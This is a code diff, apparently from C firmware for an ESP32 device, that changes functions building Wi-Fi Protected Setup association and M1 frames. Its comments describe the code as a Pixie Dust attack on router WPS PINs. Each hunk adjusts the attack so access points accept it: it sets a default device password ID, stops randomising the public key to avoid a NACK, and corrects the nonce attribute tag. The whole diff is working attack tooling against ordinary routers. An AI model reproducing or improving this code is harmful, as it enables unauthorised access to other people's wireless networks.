@@ -382,7 +382,7 @@ static int buildAssocFrame(uint8_t *buf, const uint8_t *apBssid,
         0x00,0x01,0x10,     // len=1, value=1.0
         0x10,0x12,          // attr: Device Password ID (0x1012)
         0x00,0x02,          // len=2
-        0x00,0x04,          // Device PIN (0x0004)
+        0x00,0x00,          // Default PIN (0x0000 per WPS spec Table E-6)
         0x10,0x3C,          // attr: RF Bands (0x103C)
         0x00,0x01,0x01,     // len=1, 2.4GHz
         0x10,0x49,          // attr: Vendor Extension
@@ -534,8 +534,10 @@ static uint8_t *buildM1Frame(const uint8_t *apBssid, uint8_t eapId,
     };
     uint8_t pke[192];
     memcpy(pke, valid_pke, 192);
-    for (int i = 0; i < 16; i++) pke[i] ^= (uint8_t)esp_random();
-    if (pke[0] == 0x00) pke[0] = 0x02; // DH key MSB must be non-zero
+    // Do NOT randomize any bytes of pke. The valid_pke is a mathematically valid
+    // DH group element (2 <= pke <= p-2). XOR-ing random bytes into it destroys
+    // that property and causes AP DH range check failure → immediate WSC_NACK.
+    // For pixie dust we only need a consistent, valid PKE — not a secret one.
     memcpy(eNonceOut, eNonce,  16);
 
     // Fixed enrollee attributes (values don't need to be accurate for pixie)
@@ -557,11 +559,11 @@ static uint8_t *buildM1Frame(const uint8_t *apBssid, uint8_t eapId,
     const uint8_t wifiProtected[] = {0x02};            // WPS State = Configured (0x02)
     // NOTE: 0x01 = Unconfigured. Some APs refuse PIN enrollment to an
     // "unconfigured" network. Always send 0x02 for Pixie Dust attacks.
-    const uint8_t devPassId[]     = {0x00,0x04};       // Device PIN (0x0004)
+    const uint8_t devPassId[]     = {0x00,0x00};       // Default PIN (0x0000 per WPS spec Table E-6)
     const uint8_t osVersion[]     = {0xFF,0xFF,0xFF,0xFF}; // unspecified
     const uint8_t rfBands[]       = {0x01};             // 2.4GHz
     const uint8_t assocState[]    = {0x00,0x01};        // Not associated
-    const uint8_t devPasswordId[] = {0x00,0x04};        // Device PIN (0x0004)
+    const uint8_t devPasswordId[] = {0x00,0x00};        // Default PIN (0x0000 per WPS spec Table E-6)
     const uint8_t configError[]   = {0x00,0x00};        // No error
     const uint8_t osVendorExt[]   = {0x00,0x37,0x2A,0x00,0x01,0x20}; // WFA version2=2.0
     // Device name / manufacturer (short)
@@ -605,8 +607,8 @@ static uint8_t *buildM1Frame(const uint8_t *apBssid, uint8_t eapId,
     putTlv(0x1022, msgType,        sizeof(msgType));        // Message Type = M1
     putTlv(0x1047, uuid,           sizeof(uuid));           // UUID-E
     putTlv(0x1020, macAddr,        sizeof(macAddr));        // MAC Address
-    putTlv(0x101C, eNonce,         16);                     // Enrollee Nonce (0x101C per Wi-Fi Simple Config 2.0 Table E-1)
-    putTlv(0x1032, pke,            192);                    // Enrollee Public Key
+    putTlv(0x101A, eNonce,         16);                     // Enrollee Nonce (0x101A = ATTR_ENROLLEE_NONCE per wpa_supplicant wps_defs.h)
+    putTlv(0x1032, pke,            192);                    // Public Key (0x1032 = ATTR_PUBLIC_KEY per wpa_supplicant wps_defs.h)
     putTlv(0x1004, authTypeFlags,  sizeof(authTypeFlags));  // Auth Type Flags
     putTlv(0x100D, encrTypeFlags,  sizeof(encrTypeFlags));  // Encr Type Flags
     putTlv(0x100E, connTypeFlags,  sizeof(connTypeFlags));  // Connection Type Flags
